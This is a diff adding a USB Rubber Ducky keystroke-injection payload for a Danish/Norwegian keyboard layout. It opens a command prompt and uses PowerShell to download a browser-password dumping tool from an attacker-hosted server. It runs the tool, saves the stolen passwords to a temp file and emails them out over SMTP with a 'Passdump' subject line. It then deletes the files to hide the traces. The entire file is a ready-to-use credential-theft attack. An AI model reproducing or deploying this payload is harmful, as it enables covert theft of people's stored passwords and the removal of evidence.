@@ -1,0 +1,118 @@
+REM Original Author: Pesce
+REM Original URL: https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payload---download-mimikatz%2C-grab-passwords-and-email-them-via-gmail
+REM Creation Date: 10/20/2013
+
+REM Editor: davidlj95
+REM Edition Date: 14/07/2017
+
+REM Editor: v3lip
+REM Edition Date: 26.02.2021
+
+REM Download for the payload that you need to host on your own server: https://www.nirsoft.net/utils/web_browser_password.html
+REM Download for the payload that you need to host on your own server: https://www.nirsoft.net/utils/web_browser_password.html
+REM Download for the payload that you need to host on your own server: https://www.nirsoft.net/utils/web_browser_password.html
+
+REM You probably have to tinker a bit if you don't use the Norwegian/Danish keyboard layout. This works for my norwegian keyboard layout.
+LOCALE DK
+
+REM ------------------------------------------------1. Open CMD
+LED 0 0 255
+DELAY 3000
+LED 0 255 0
+CONTROL ESCAPE
+DELAY 400
+STRING cmd
+DELAY 400
+ENTER
+DELAY 300
+
+REM ------------------------------------------------2. Download tool (host it in your server)
+STRING powershell (New-Object System.Net.WebClient).DownloadFile('http://example.com/WBPV/hero.exe','%TEMP%/hero.exe');
+ENTER
+REM (Customize your download time below)
+DELAY 3500
+
+REM ------------------------------------------------3. Save the passwords
+STRING %TEMP%/hero.exe
+ENTER
+DELAY 2000
+CTRL a
+DELAY 200
+CTRL s
+DELAY 300
+STRING %TEMP%
+LOCALE US
+STRING =
+LOCALE DK
+STRING pass.txt
+DELAY 500
+ENTER
+DELAY 400
+ALT F4
+DELAY 300
+
+REM ------------------------------------------------4. Send them via email
+STRING powershell
+ENTER
+DELAY 300
+STRING $SMTPServer = 'smtp.example.com'
+ENTER
+STRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
+ENTER
+STRING $SMTPInfo.EnableSsl = $true
+ENTER
+STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('EMAIL', 'EMAILPASSWORD');
+ENTER
+STRING $ReportEmail = New-Object System.Net.Mail.MailMessage
+ENTER
+STRING $ReportEmail.From = 'EMAILFROM'
+ENTER
+STRING $ReportEmail.To.Add('EMAILTO')
+ENTER
+STRING $ReportEmail.Subject = 'Passdump for: ' + $(hostname)
+ENTER
+STRING $ReportEmail.Body = 'Attached is your information file for:' + $(hostname)
+ENTER
+STRING cd $env:temp
+ENTER
+STRING $ReportEmail.Attachments.Add($env:temp + '
+LOCALE US
+STRING =
+LOCALE DK
+STRING pass.txt')
+ENTER
+STRING $SMTPInfo.Send($ReportEmail)
+ENTER
+DELAY 7000
+STRING exit
+ENTER
+DELAY 100
+STRING exit
+ENTER
+
+
+REM ------------------------------------------------5. Clean everything
+DELAY 200
+CONTROL ESCAPE
+DELAY 400
+STRING cmd
+DELAY 400
+ENTER
+DELAY 300
+STRING powershell
+DELAY 300
+ENTER
+DELAY 300
+
+STRING cd $env:temp
+ENTER
+STRING Remove-Item -path pass.* -recurse
+ENTER
+STRING Remove-Item -path hero.* -recurse
+ENTER
+DELAY 300
+STRING exit
+ENTER
+STRING exit
+ENTER
+LED 255 0 0
